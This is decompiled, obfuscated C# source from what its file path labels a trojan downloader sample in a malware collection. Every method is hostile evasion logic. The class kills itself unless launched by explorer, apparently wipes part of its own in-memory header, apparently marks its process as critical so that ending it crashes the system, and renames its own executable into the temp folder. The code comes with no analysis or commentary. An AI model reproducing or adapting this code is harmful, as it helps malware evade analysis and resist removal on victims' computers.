// Decompiled with JetBrains decompiler
// Type: ᥟޱഁेࠃᵷᣚ.ူ᳒ؕ
// Assembly: lgy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F6858297-EDCC-46A7-BF64-CBC6BE6B3CD4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.Crypted.ej-8021b1adb21670f837224cd99ccee8599abd7a84c7c3cf7b87df9da753a7739c.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace ᥟޱഁेࠃᵷᣚ
{
  public static class \u1030᳒ؕ
  {
    public static void æ()
    {
      if (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.ݝȮ᯳ᴨເ\u17F3)
        \u1030᳒ؕ.ᇂᵐ();
      if (ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u0D81ᶸጞऒ && !\u1030᳒ؕ.ᄃ\u1366ñྪ্)
        Process.GetCurrentProcess().Kill();
      if (!ᎎ\u0AF0౩ᙼሼ༾Ϗݻໟ.\u0BF7ᕯ\u187Eᠥᮞ\u066B\u0FF2ᶥ)
        return;
      \u1030᳒ؕ.\u17F4པྻᰇ\u098DᑪỬ();
    }

    public static void ᇂᵐ()
    {
      try
      {
        IntPtr num = ᔂଋᦑ\u0FD4Ỉ\u0F3Dଫ.\u1047ژÚ((string) null);
        ᔂଋᦑ\u0FD4Ỉ\u0F3Dଫ.ဋཉύᇢ\u1CB8η\u08B5Θե(num, 512U, 4U, out uint _);
        ᔂଋᦑ\u0FD4Ỉ\u0F3Dଫ.\u0E67ᥟӣۄąŽΤ(num, (IntPtr) 512);
      }
      catch
      {
      }
    }

    public static void \u17F4པྻᰇ\u098DᑪỬ()
    {
      try
      {
        int num = 1;
        ᔂଋᦑ\u0FD4Ỉ\u0F3Dଫ.ԩߏ(Process.GetCurrentProcess().Handle, 29, ref num, 4);
      }
      catch
      {
      }
    }

    public static bool ᄃ\u1366ñྪ্
    {
      get
      {
        using (ManagementObject managementObject = new ManagementObject("win32_process.handle='" + Process.GetCurrentProcess().Id.ToString() + "'"))
        {
          managementObject.Get();
          return !(Process.GetProcessById(Convert.ToInt32(managementObject["ParentProcessId"])).ProcessName.ToLower() != "explorer");
        }
      }
    }

    public static void ᓍ\u171Aº\u007D\u1A8Dᖽᗢ()
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        string destFileName = tempFileName.Replace(".tmp", ".exe");
        File.Move(Process.GetCurrentProcess().MainModule.FileName, destFileName);
      }
      catch
      {
      }
    }
  }
}
